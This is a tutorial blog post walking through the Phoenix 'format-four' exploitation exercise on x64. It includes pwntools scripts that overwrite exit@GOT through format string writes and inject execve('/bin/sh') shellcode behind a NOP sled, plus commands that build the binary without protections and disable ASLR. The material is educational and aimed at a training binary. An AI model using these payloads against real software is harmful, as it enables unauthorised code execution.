---
layout: post
title: "An introduction to format string vulnerabilities with Phoenix/Format Four"
date: 2026-07-09
tags: [Exploitation, Format Strings]
---

The Phoenix series by [Exploit Education](https://exploit.education) is an excellent introduction to memory corruption. In this article, we'll be using the **format-four** exercise to explore format string vulnerabilities. Again, I do these exercises in x64 architecture so they will vary from the standard x86 solutions.

## **Introduction**

The purpose of this article is to explore an introductory format strings vulnerability

What will this article cover:
 - **What is a format string**
 - **How does this become dangerous**
 - **Differentiation between normal overflows**
 - **Introducing the challenge**
 - **What is the Global Offset Table**
 - **Finding the `exit()` address with `objdump`**
 - **Finding the address with `GDB`**
 - **Finding the offsets with `Python`**
 - **Shifting via block size**
 - **Using `pwntools` to overwrite memory**
 - **Adapting the script into ret2shellcode**
 - **Finding the address of the buffer with `GDB`**
 - **Approximating payload size**
 - **Using `pwntools` to write an exploit**

## **What is a format string**

A format string is simply a template text containing special placeholder tokens called format specifiers that specify the type and layout of the data to be displayed. 
```c
#include <stdio.h>

int main() {
    int placeholder = 1;
    printf("%d", placeholder);
    return 0;
}
```
An example of a format string being used in the C programming language that defines an integer placeholder as 1 then calls the `printf` function to print the placeholder to the standard output and then return normally.

The `printf` function in C only requires one argument, the format argument. `printf(const char *format, ...)`. The other optional and variable number of arguments follow this first argument and contain the data to be printed. 

## **How does this become dangerous**

When an attacker controls the actual format string of a format string function, i.e. `printf(input, ...)`. It allows the attacker to arbitrarily insert format specifiers in unintended locations. The side effect of this capability is that the attacker can now both read and write arbitrary memory.

## **Differentiation between normal overflows**

While a normal buffer overflow and a format string attack both can arbitrarily overwrite memory, they accomplish the goal in separate ways. A normal buffer overflow works by exceeding the allocated buffer capacity and physically overwriting the memory address while a format string attack leverages built-in function logic to directly overwrite the memory address.

| Buffer Overflow | Format String Attack |
| --- | --- |
| Exceeds the allocated buffer | Directly writes/reads to/from address |

Format string attacks also have the advantage of having the ability to directly read arbitrary memory addresses which means format strings can be used to leak information as well.

## **Introducing the challenge**

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LEVELNAME "Format Four"
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```
```bash
gcc -fno-stack-protector -z execstack -no-pie -o format-four format-four.c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # Change back to 2 after
```

Our goal is to redirect the execution into the congratulations, I will show a solution that simply overwrites the memory address and an example of writing shellcode to a buffer and then redirecting execution flow into the shellcode.

## **What is the Global Offset Table**

The global offset table, usually referred to as the GOT in short, is a section of an ELF binary that stores absolute memory addresses of external functions and data from libraries. The Global Offset Table itself is a target for exploitation as the Procedural Linkage Table redirects execution through it and when the attacker controls the addresses in the Global Offset Table, they therefore control execution flow via the Procedural Linkage Table. It's kind of like having control of the ball that the dog will chase. 

## **Finding the `exit()` address with `objdump`**

In order to redirect execution flow via the `exit()` function we need to know where the `exit()` function lies in memory in order to overwrite the correct address. 

```
┌──(kali㉿kali)-[~]
└─$ objdump -R ./format-four                            

./format-four:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403fd8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403fe0 R_X86_64_GLOB_DAT  __gmon_start__
0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404008 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404010 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
```

The `-R` flag in `objdump` allows us to observe the dynamic relocation records for a binary, i.e. where the code goes in memory when it reaches some external function.

From the output of the `objdump` command we can see that the `exit()` function resides at the memory location `0x0000000000404018`.

## **Finding an address with `GDB`**

Now, all we need to do is find the address we want to overwrite via `GDB`
```
┌──(kali㉿kali)-[~]
└─$ gdb -q ./format-four 
Reading symbols from ./format-four...
(No debugging symbols found in ./format-four)
(gdb) set exec-wrapper env -i
(gdb) disas congratulations
Dump of assembler code for function congratulations:
   0x000000000040117d <+0>:     push   rbp
   0x000000000040117e <+1>:     mov    rbp,rsp
   0x0000000000401181 <+4>:     lea    rax,[rip+0xe80]        # 0x402008
   0x0000000000401188 <+11>:    mov    rdi,rax
   0x000000000040118b <+14>:    call   0x401030 <puts@plt>
   0x0000000000401190 <+19>:    mov    edi,0x0
   0x0000000000401195 <+24>:    call   0x401060 <exit@plt>
End of assembler dump.
(gdb)
```

From the output of `GDB` we see that the congratulations function starts at the memory address `0x000000000040117d`

## **Using `Python` to find the offset**

Using an inline `Python` script for a simple payload we can use to determine the offset that our input lands at

```
┌──(kali㉿kali)-[~]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four          
Welcome to Format Four, brought to you by https://exploit.education
AAAAAAAA
0x7fffffffcd70
(nil)
0x388
(nil)
(nil)
(nil)
0x7fffffffcd70
0x7fffffffdd70
0x4011f8
0x7fffffffde88
0x1001e2db8
0x4141414141414141
0x250a70250a70250a
0xa70250a70250a70
0x70250a70250a7025
0x250a70250a70250a
0xa70250a70250a70
0x70250a70250a7025
0x250a70250a70250a
0xa70250a70
```

Our A's appear in the 12th slot of the script's output. We can verify that the input is stored in adjacent memory by expanding the payload

```
┌──(kali㉿kali)-[~]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four
Welcome to Format Four, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAA
0x7fffffffcd70
(nil)
0x388
(nil)
(nil)
(nil)
0x7fffffffcd70
0x7fffffffdd70
0x4011f8
0x7fffffffde88
0x1001e2db8
0x4141414141414141
0x4141414141414141
0x4141414141414141
0x250a70250a414141
0xa70250a70250a70
0x70250a70250a7025
0x250a70250a70250a
0xa70250a70250a70
0x70250a70250a7025
�; 
```

As seen by the output of the updated script we have confirmed that the input overflows into the 13th and 14th slot from the original 12th slot.

## **Shifting via block size**

In order to overwrite the memory we'll need to overwrite the three lowest bytes (all those 0's in `0x0000000000404018` and `0x000000000040117d` don't really matter, just `0x404018` and `0x40117d`). This means we'll need three blocks. Given that we'll likely need to pad by two digits that gives us the section `%NNc` where N is an integer and we need to write those digits so that gives us the section `%NN$hhn` where N is an integer. These two sections will be joined together into `%NNc%NN$hhn` to form a block which has a total length of 11 bytes. We need three of these blocks to overwrite the three bytes meaning we'll have a total length of 33 bytes. 

These blocks must be 8-byte aligned so we'll need to pad them to reach a 40-byte long format block. This format block can be broken up into five quad-words which will be stored by the registers.

```
[ format ]
[ format ]
[ format ]
[ format ]
[ format ]
[ stack  ]
```

The effect that this has is that the slots are offset by five meaning that slot 12 is actually argument 17, slot 13 is actually argument 18, and slot 14 is actually argument 19.

## **Using `pwntools` to overwrite memory**

In this example solution, I will simply solve the exercise by overwriting the address

```python
from pwn import *
from subprocess import run
context.arch = 'amd64'

exit = 0x0000000000404018
congratulations = 0x000000000040117d

fmt  = b'%17c%17$hhn'        # count 17  -> 0x11  written to (ptr at arg 17)
fmt += b'%47c%18$hhn'        # +47 = 64  -> 0x40  written to (ptr at arg 18)
fmt += b'%61c%19$hhn'        # +61 = 125 -> 0x7d  written to (ptr at arg 19)
fmt  = fmt.ljust(40, b'A')   # pad to 5 qwords (8-byte boundary)

buf  = fmt
buf += p64(0x404019)   # arg 17 -> byte 0x11
buf += p64(0x40401a)   # arg 18 -> byte 0x40
buf += p64(0x404018)   # arg 19 -> byte 0x7d
buf += b"\n"

result = run(["./format-four"], input=buf)
```

### **The first section handles imports and setup**

```python
from pwn import *
from subprocess import run
context.arch = 'amd64'
```

### **The second section defines the `exit()` and `congratulations()` addresses**

```python
exit = 0x0000000000404018
congratulations = 0x000000000040117d
```

### **The third section writes to the addresses**

```python
fmt  = b'%17c%17$hhn'        # count 17  -> 0x11  written to (ptr at arg 17)
fmt += b'%47c%18$hhn'        # +47 = 64  -> 0x40  written to (ptr at arg 18)
fmt += b'%61c%19$hhn'        # +61 = 125 -> 0x7d  written to (ptr at arg 19)
fmt  = fmt.ljust(40, b'A')   # pad to 5 qwords (8-byte boundary)
```

We need to write the values `0x11`, `0x40`, and `0x7d` into registers in order to use them to write the value `0x000000000040117d` later. The reason we do 17 or `0x11` first is because the `printf()` counter only goes up so we need to write in ascending order.

| Padding | Write | Value |
| --- | --- | --- |
| %17c = 17 padding bytes | %17$hhn = write count to 17 | count = 17 (`0x11`) |
| %47c = 47 padding bytes | %18$hhn = write count to 18 | count = 64 (`0x40`) |
| %61c = 61 padding bytes | %19$hhn = write count to 19 | count = 125 (`0x7d`) |

In more specific terms, the operation we perform with each of these format strings are as follows: **1)** Advance the counter to 17 then write the low-byte of the counter (`0x11`) into the address held by argument 17. **2)** Advance the counter by 47 to reach 64 then write the low-byte of the counter (`0x40`) into the address held by argument 18. **3)** Advance the counter by 61 to reach 125 then write the low-byte of the counter (`0x7d`) into the address held by argument 19.

### **The fourth section assembles the payload**

```python
buf  = fmt
buf += p64(0x404019)   # arg 17 -> byte 0x11
buf += p64(0x40401a)   # arg 18 -> byte 0x40
buf += p64(0x404018)   # arg 19 -> byte 0x7d
```

We know that the `exit()` address starts at `0x0000000000404018` so we can assemble the payload after the constructed format string accordingly **(remember that we must follow little-endian ordering)**. 

```
arg 17 (0x11) <--- 0x11 is written in 2nd position (0x404018 + 1)
arg 18 (0x40) <--- 0x40 is written in 3rd position (0x404018 + 2)
arg 19 (0x7d) <--- 0x7d is written in 1st position (0x404018 + 0)

\x7d\x11\x40
^ Little Endian

\x40\x11\x7d
^ Big Endian
```

### **The fifth section spawns the process and feeds the payload to the binary**

```python
result = run(["./format-four"], input=buf)
```

## **Expected Output**

```
┌──(kali㉿kali)-[~]
└─$ python3 format-four-solve.py
Welcome to Format Four, brought to you by https://exploit.education
                �                                                                                                          �AAAAAAA@@Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
```

The exploit leaves us in a constant loop of congratulations which is nice but a shallow prize.

## **Adapting the script into ret2shellcode**

In order to adapt this from redirecting execution flow to spawning a shell we'll need to do two things, place `shellcode` on the stack and redirect execution flow to the `shellcode` we placed instead of just redirecting the execution flow to an existing function.

The first crucial step in adapting this exploit to work with `shellcode` is that we must find the buffer that we plan to place the `shellcode` in, in order to accurately redirect execution flow to the buffer address when we control it. 

## **Finding the address of the buffer with `GDB`**

First, we'll need to find the address of the buffer. The address to the buffer is used as the `RDI` register argument of the internal function `bounce()` so we can set a breakpoint and read the value of the `RDI` register to extract the buffer's address.
```
┌──(kali㉿kali)-[~]
└─$ gdb -q ./format-four
Reading symbols from ./format-four...
(No debugging symbols found in ./format-four)
(gdb) set exec-wrapper env -i
(gdb) disas bounce
Dump of assembler code for function bounce:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     sub    rsp,0x10
   0x000000000040115e <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401162 <+12>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401166 <+16>:    mov    rdi,rax
   0x0000000000401169 <+19>:    mov    eax,0x0
   0x000000000040116e <+24>:    call   0x401040 <printf@plt>
   0x0000000000401173 <+29>:    mov    edi,0x0
   0x0000000000401178 <+34>:    call   0x401060 <exit@plt>
End of assembler dump.
(gdb) b *0x0000000000401156
Breakpoint 1 at 0x401156
(gdb) r
Starting program: /home/kali/format-four 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Format Four, brought to you by https://exploit.education
AAAA

Breakpoint 1, 0x0000000000401156 in bounce ()
(gdb) p/x $rdi
$1 = 0x7fffffffdd00
(gdb) 
```

You may be wondering why I used `set exec-wrapper env -i`, this is because we must strip the environment in both the reconnaissance and the payload in order to ensure the most accurate results. In addition, `GDB` uses the full path so when we use the binary in our exploit we should call the full path too. 

## **Approximating payload size**

We want to write a stack address which means that instead of writing three bytes like in the previous example we'll need to write six bytes instead which naturally makes our payload larger. Right now, we don't know the exact address but we know it will resemble `0x7fffffffNNNN` where N is a hexadecimal byte.

Decomposing this unknown sequence of bytes in order to understand the grouping, in order to make this grouping make sense we'll assume that `NN` are two separate values less than `7f`. We'll place `NN` and `NN` as the first two bytes as we don't know these values for sure yet. The next byte in this framing will be `7f` and the final bytes will be `ff`, `ff`, and `ff`. An important thing to note about this construction is that `ff` appears three times which means there will be two blocks that don't increment the counter at all, based on information from the first example we can assume that these blocks without a counter increment will look like `%NN$hhn` where N is an integer. Therefore, we can determine the length of these format blocks with a decent amount of certainty to be seven bytes in length.

```
[NN]~~~~~[NN]~~~~~[7f]~~~~~[ff]
      x        y        z  [ff]
                           [ff]
```

I hope this diagram offers more insight into understanding the structure, the lowest byte must traverse **x** bytes to get to the second lowest byte and **y** bytes to get to the third lowest byte and **z** bytes to get to the `ff` byte structure but once it reaches the `ff` structure we can be certain of the length it must travel to get to the next bytes because the length it must travel is zero.

In other words, we know that we will perform four full writes in the general format of `%NNc%NN$hhn` where N is an integer and two zero-gap writes `%NN$hhn` where N is an integer and the length is very likely to be seven given previous knowledge of the binary.

If we then, knowing that the other block which contain some form of `%NNc%NN$hhn`, use the previous example as a reference (11 bytes per full write block) we can infer that the total length may be something like 4(11) + 2(7) or 58. 

58 is not divisible by eight so we'll need to pad to the next number divisible by 8 which is 64.

This means that there will be eight quad words and therefore we need to offset the slots by eight instead of five. In case you need a refresher on which slot the buffer ends up, I copied the initial output.

```
┌──(kali㉿kali)-[~]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four          
Welcome to Format Four, brought to you by https://exploit.education
AAAAAAAA
0x7fffffffcd70
(nil)
0x388
(nil)
(nil)
(nil)
0x7fffffffcd70
0x7fffffffdd70
0x4011f8
0x7fffffffde88
0x1001e2db8
0x4141414141414141
0x250a70250a70250a
0xa70250a70250a70
0x70250a70250a7025
0x250a70250a70250a
0xa70250a70250a70
0x70250a70250a7025
0x250a70250a70250a
0xa70250a70
``` 

## **Using `pwntools` to write an exploit**

The exploit looks a bit more complicated but it's really not that bad once we break things down into more manageable chunks
```python
from pwn import *
context.arch = 'amd64'

BUF = 0x7fffffffdd00
EXIT_GOT = 0x404018
FMT_LEN = 64
SLED = 64
ARG0 = 20
shell_addr = BUF + FMT_LEN + 48 + SLED // 2

tgt = sorted(((shell_addr >> (8*i)) & 0xff, EXIT_GOT + i) for i in range(6))

fmt, count, ptrs = b'', 0, []
for val, addr in tgt:
    gap = (val - count) % 256
    if gap:
        fmt += b'%%%dc' % gap
        count += gap
    fmt += b'%%%d$hhn' % (ARG0 + len(ptrs))
    ptrs.append(addr)

buf  = fmt.ljust(FMT_LEN, b'A') + b''.join(p64(a) for a in ptrs)
buf += b'\x90'*SLED
buf += b"\x48\x81\xec\x00\x01\x00\x00" 
buf += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p = process(["/home/kali/format-four"], env={})
p.sendline(buf)
p.interactive()
```

### **The first section handles imports and setup**

```python
from pwn import *
context.arch = 'amd64'
```

### **The second section defines important variables**

```python
BUF = 0x7fffffffdd00
EXIT_GOT = 0x404018
FMT_LEN = 64
SLED = 64
ARG0 = 20
shell_addr = BUF + FMT_LEN + 48 + SLED // 2
```

The first variable is the address of the buffer variable, the second variable is the address of the `exit()` function as defined by the Global Offset Table, the third variable is the length of the format string payload, the fourth variable is the length of the `NOP` sled we'll implement to enhance reliability of our exploit, the fifth variable is the starting argument. The final variable in this section is the "address of the `shellcode`", in reality we add the buffer address to the length of the format string and then add that number to 48, which is the length six quad word pointers take up (6 * 8 = 48), then finally we add half of the sled to our "address of the shellcode" so our "address to the shellcode" is actually in the middle of a `NOP` sled to improve reliability

### **The third section splits the target address into byte-writes**

```python
tgt = sorted(((shell_addr >> (8*i)) & 0xff, EXIT_GOT + i) for i in range(6))
```
This section may seem a bit complicated if you're not used to the syntax and bitwise operations because there is a decent amount going on in this one line. 

`(shell_addr >> (8*i)) & 0xff` pulls out byte number i, counting from the low end. `>> (8*i)` shifts the address right by i whole bytes (8 bits each), moving the byte you want down into the lowest position; `& 0xff` masks off everything above it, leaving just that one byte. And then this process is repeated 6 times by the for loop

```
i=0:  >> 0   -> 0x7fffffffdd90 & 0xff = 0x90   (144)
i=1:  >> 8   -> 0x7fffffffdd   & 0xff = 0xdd   (221)
i=2:  >> 16  -> 0x7fffffff     & 0xff = 0xff   (255)
i=3:  >> 24  -> 0x7fffff       & 0xff = 0xff   (255)
i=4:  >> 32  -> 0x7fff         & 0xff = 0xff   (255)
i=5:  >> 40  -> 0x7f           & 0xff = 0x7f   (127)
```

This creates the byte part of `(byte, EXIT_GOT + i)`, by resolving that second part, `EXIT_GOT + i` we can create **(byte, destination)** pairs

```
(0x90, 0x404018)
(0xdd, 0x404019)
(0xff, 0x40401a)
(0xff, 0x40401b)
(0xff, 0x40401c)
(0x7f, 0x40401d)
```

You may have noticed that these pairs are not in order and you may recall from earlier that the count only goes up so the final part of this line sorts them

```
(0x7f, 0x40401d)   127
(0x90, 0x404018)   144
(0xdd, 0x404019)   221
(0xff, 0x40401a)   255
(0xff, 0x40401b)   255
(0xff, 0x40401c)   255
```

### **The fourth section builds the format string**

```python
fmt, count, ptrs = b'', 0, []
for val, addr in tgt:
    gap = (val - count) % 256
    if gap:
        fmt += b'%%%dc' % gap
        count += gap
    fmt += b'%%%d$hhn' % (ARG0 + len(ptrs))
    ptrs.append(addr)
```

This turns the sorted **(byte, destination)** pairs into the actual printf directives, and simultaneously collects the pointers in matching order.

First, we define the accumulators that accumulate the format string, the count for the format string, and the pointers for the blocks.

```python
fmt, count, ptrs = b'', 0, []
```

Next, we run the loop

```python
for val, addr in tgt:
    gap = (val - count) % 256
    if gap:
        fmt += b'%%%dc' % gap
        count += gap
    fmt += b'%%%d$hhn' % (ARG0 + len(ptrs))
    ptrs.append(addr)
```

The first line computes the gap, if there is a gap. It adds the necessary padding bytes and increments the count variable by the gap. Then, regardless of if there is a gap or not, it also adds the argument to write to and appends the address to the `ptrs` variable.

### **The fifth section handles payload assembly**

```python
buf  = fmt.ljust(FMT_LEN, b'A') + b''.join(p64(a) for a in ptrs)
buf += b'\x90'*SLED
buf += b"\x48\x81\xec\x00\x01\x00\x00" 
buf += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

The first line left justifies the format string payload by padding to the format length requirement we defined, the next line is simply adding a `NOP` sled to the payload. The line after that contains instructions in byte form to prepare the stack for the `shellcode` and the final line is the actual `shellcode`.

#### **Part 1 - stack fixup**
 
| Bytes | Instruction | Effect |
|---|---|---|
| `48 81 ec 00 01 00 00` | `sub rsp, 0x100` | Drop `rsp` 256 bytes below the shellcode so the upcoming pushes don't clobber unrun code (avoids SIGILL). |
 
#### **Part 2 - execve("/bin//sh", NULL, NULL)**
 
| Bytes | Instruction | Effect |
|---|---|---|
| `48 31 f6` | `xor rsi, rsi` | `rsi = 0` => argv = NULL, also serves as the string terminator |
| `56` | `push rsi` | Push a NULL to terminate `"/bin//sh"` on the stack |
| `48 bf 2f 62 69 6e 2f 2f 73 68` | `movabs rdi, "/bin//sh"` | Load 8 ASCII bytes; the `//` is padding to make exactly 8 (kernel treats `//` as `/`) |
| `57` | `push rdi` | Write `"/bin//sh"` onto the stack |
| `54` | `push rsp` | Push a pointer to that string |
| `5f` | `pop rdi` | `rdi` -> `"/bin//sh"` (execve arg 1, the path) |
| `6a 3b` | `push 0x3b` | The execve syscall number |
| `58` | `pop rax` | `rax = 0x3b` (selects execve) |
| `99` | `cdq` | `rdx = 0` (envp = NULL) — cheap way to zero `rdx` |
| `0f 05` | `syscall` | `execve("/bin//sh", NULL, NULL)` -> shell |

### **The sixth section delivers the payload**

```python
p = process(["/home/kali/format-four"], env={})
p.sendline(buf)
p.interactive()
```

We create a clean process, send the payload with `sendline()`, and hand over the interactive shell with `interactive`.

## **Expected Output**

```
┌──(kali㉿kali)-[~]
└─$ python3 format-four-exploit.py
[+] Starting local process '/home/kali/format-four': pid 310365
[*] Switching to interactive mode
Welcome to Format Four, brought to you by https://exploit.education
$ whoami
kali
$  
```

Running the exploit will trigger the system to spawn a shell in place of the binary's normal functionality.

## **Conclusion**

In this article, we explored how direct arbitrary writes via format string vulnerabilities could be leveraged for basic exploitation. Thank you for sticking around to the end of the article, I hope you learned something from it or that you found the content entertaining <3